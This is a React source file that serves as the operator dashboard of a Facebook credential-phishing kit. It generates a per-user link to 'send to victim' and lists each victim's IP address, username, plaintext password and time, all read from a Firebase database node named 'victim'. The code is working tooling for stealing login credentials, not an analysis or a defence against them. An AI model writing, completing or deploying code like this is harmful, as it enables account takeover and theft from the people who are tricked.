import { useEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom"
import { auth, database } from "../../../DATABASE/Config";
import { onValue, ref } from "firebase/database";
import useRoutProtect from "../../../CUSTOMHOOK/useRoutProtect";

const FacebookLink = () => {
  const {uid} = useParams();
  const [link, setLink] = useState(`${window.location.host}/facebook/${uid}`)
  const [isCopied, setCopied] = useState(false);
  const [data, setData] = useState([])

  const loginNavigate = useNavigate();

  useRoutProtect(auth, uid, loginNavigate)


  useEffect(() => {
    const dbRef = ref(database, `user/${uid}/victim/facebook`);

    onValue(dbRef, (snapshot) => {
      const dataArray = [];
      snapshot.forEach((childSnapshot) => {
        dataArray.push(childSnapshot.val());
      });
      setData(dataArray)
    });
    
  },[uid])


  const copyToClipBoard = () => {

    navigator.clipboard.writeText(link)
    .then(() => setCopied(true))
  }
  
  return (
    <div className="h-screen  w-full">
      <div className="flex justify-center p-5">
        <div className="mr-5 flex flex-col items-center justify-center">
          <h1 className="font-bold py-3">Copy the link and sent to victim</h1>
          <textarea value={link} className="h-10 w-96 border border-black rounded-xl overflow-hidden "></textarea>
        </div>
        <button onClick={copyToClipBoard} className="flex items-center justify-center border px-4 rounded-xl bg-blue-500 focus:bg-orange-600">{isCopied ? "Copied" : "Copy"}</button>
      </div>
      <div>
        <div className="flex justify-center">
          <table className="border ">
            <thead>
              <tr>
                <th>Ip</th>
                <th>User</th>
                <th>Password</th>
                <th>Time</th>
              </tr>
            </thead>
            <tbody>
              
              {data.map((victim) => {
                const {date, user, password, ip} = victim;
                return <tr key={date}>
                  <td className="border border-black p-2">{ip}</td>
                  <td className="border border-black p-2">{user}</td>
                  <td className="border border-black p-2">{password}</td>
                  <td className="border border-black p-2">{date}</td>
                </tr>
              })}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}

export default FacebookLink